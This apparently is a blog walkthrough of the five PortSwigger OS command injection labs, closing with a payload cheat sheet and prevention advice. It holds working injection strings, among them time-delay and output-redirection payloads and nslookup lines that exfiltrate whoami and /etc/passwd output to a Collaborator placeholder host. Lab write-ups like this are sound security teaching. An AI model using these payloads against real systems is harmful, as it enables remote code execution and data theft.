---
title: "PortSwigger OS Command Injection Labs — Complete Walkthrough"
date: 2026-09-22 07:10:00 +0000
categories: [Web Penetration Testing]
tags: [OS Command Injection, PortSwigger, Web Security Academy, RCE]
description: "All 5 PortSwigger OS command injection labs: in-band command execution plus blind time-delay, output-redirection and out-of-band (OAST) data exfiltration."
author: Paschal Sangawe
toc: true
---

OS command injection (also called shell injection) happens when an application passes user input into a system shell. Unlike SQL or path traversal, the payload is executed by the **operating system**, so a single injection typically means full RCE on the host. It usually appears wherever an app shells out — ping/traceroute tools, image/PDF converters, backup scripts, or any call to `system()`, `exec()`, `popen()` or `Runtime.exec()`.

This post covers all **5 PortSwigger OS command injection labs**, from trivial in-band execution to blind out-of-band exfiltration.

## Background — command separators

If a parameter is embedded in a shell command such as `ping -c 1 <input>`, we can chain our own command using a shell metacharacter:

| Separator | Behaviour |
|-----------|-----------|
| `;` | Run next command regardless |
| `\|` (pipe) | Send output of left into right; runs both |
| `\|\|` | Run right only if left fails (logical OR) |
| `&&` | Run right only if left succeeds (logical AND) |
| `&` | Run left in background, then right |
| `` `cmd` `` / `$(cmd)` | Command substitution — embeds output inline |
| newline (`%0a`) | Ends the command, starts a new one |

Which one works depends on the surrounding command, how the app handles quotes, and the OS (Linux vs Windows uses `&`/`&&`/`|` and `%VAR%`).

## Lab 1 — OS command injection, simple case

**Difficulty:** Apprentice
**Goal:** Execute `whoami` and read its output.

The stock-check feature passes the `storeID` into a shell command. Inject directly and the output is reflected in the response:

```text
storeID=1|whoami
```

The pipe runs `whoami` and the current username appears in the stock-level response.

> **[Screenshot]** `storeID=1|whoami` request with the username in the response.

## Lab 2 — Blind OS command injection with time delays

**Difficulty:** Apprentice
**Goal:** Prove command execution when nothing is reflected.

The feedback form passes the `email` parameter to a shell command. There is no output in the response, so we use a **time delay** as the oracle:

```text
email=x||ping+-c+10+127.0.0.1||
```

(URL-encoded: the spaces are `+`.) The response now takes about 10 seconds — confirming the command ran.

> **Why `||`:** the original command likely fails because `x` is not a valid argument, so the `||` branch executes our `ping`.

Other delay primitives: `sleep 10` (Linux), `timeout 10` / `ping -n 10 127.0.0.1` (Windows), `sleep 10 &` to background it.

## Lab 3 — Blind OS command injection with output redirection

**Difficulty:** Practitioner
**Goal:** Capture command output when it is not returned in the response.

We redirect the command's output into a file inside the web root, then fetch that file through a separate feature.

**Step 1** — inject and redirect into a writable, web-served directory:

```text
email=||whoami>/var/www/images/output.txt||
```

**Step 2** — load a product image, but swap the filename for the file we created:

```text
filename=output.txt
```

**Step 3** — the image request now returns the file contents, i.e. the `whoami` output.

> **[Screenshot]** The `filename=output.txt` request returning the redirected command output.

## Lab 4 — Blind OS command injection with out-of-band interaction

**Difficulty:** Practitioner
**Goal:** Trigger an external DNS lookup when timing and output channels are unavailable.

The command is executed **asynchronously** and does not affect the response at all — so neither reflected output nor timing helps. Out-of-band (OAST) is the answer. Use `nslookup` to force a DNS request to Burp Collaborator:

```text
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

In Burp, select the placeholder and choose **Insert Collaborator payload**, send the request, then poll Collaborator for a DNS/HTTP interaction.

> **Using Community Edition:** Collaborator requires Burp Professional. A self-hosted OAST server such as `interactsh` or a `canarytokens.org` token works the same way — substitute its hostname.

## Lab 5 — Blind OS command injection with out-of-band data exfiltration

**Difficulty:** Practitioner
**Goal:** Leak the output of a command through DNS.

Same OAST technique, but now we embed command output in the looked-up hostname using backticks:

```text
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

Poll Collaborator; the DNS interaction's subdomain contains the username. To read a file, replace `whoami` with `cat /etc/passwd` or similar:

```text
email=||nslookup+`cat+/etc/passwd`.BURP-COLLABORATOR-SUBDOMAIN||
```

> **[Screenshot]** Collaborator interaction where the subdomain holds the exfiltrated output.

## Cheat sheet

| Channel | Example payload |
|---------|-----------------|
| In-band (reflected) | `1\|whoami` |
| In-band (subshell) | `1;whoami` / `` 1`whoami` `` |
| Time delay | `x\|\|ping+-c+10+127.0.0.1\|\|` |
| Output redirection | `\|\|whoami>/var/www/images/out.txt\|\|` |
| OAST interaction | `x\|\|nslookup+x.COLLABORATOR\|\|` |
| OAST exfiltration | `` x\|\|nslookup+`whoami`.COLLABORATOR\|\| `` |

## Prevention

- **Avoid the shell entirely.** Use language-native APIs (e.g. `ProcessBuilder` with an argument list, Python `subprocess.run([...], shell=False)`) so user input cannot be interpreted as shell syntax.
- If a shell is unavoidable, validate the input against a strict **allow-list** (e.g. only `[a-zA-Z0-9.]` for a hostname) and never concatenate raw input.
- Escape/quote correctly for the target shell — but treat this as defence in depth, not the primary fix.
- Run the application with **least privilege** so a compromise is contained, and restrict outbound network/DNS egress to blunt OAST exfiltration.

## Related posts

- [File Upload labs](/posts/portswigger-file-upload-labs/)
- [Path Traversal / File Inclusion labs](/posts/portswigger-path-traversal-labs/)
- [SQL Injection lab series](/posts/portswigger-sqli-part-1-basics/)
